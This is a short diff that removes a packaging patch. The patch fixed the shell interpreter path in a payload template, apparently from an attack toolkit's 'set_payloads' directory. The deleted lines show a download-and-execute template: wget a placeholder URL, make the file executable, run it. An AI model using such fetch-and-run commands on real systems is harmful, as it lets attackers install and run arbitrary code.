@@ -1,9 +1,0 @@
-Description: fix interpreter path
---- a/src/payloads/set_payloads/downloader.posix
-+++ b/src/payloads/set_payloads/downloader.posix
-@@ -1,4 +1,4 @@
--#!/usr/bin/sh
-+#!/bin/sh
- wget URLHERE
- chmod +x FILENAMEHERE
- ./ FILENAMEHERE
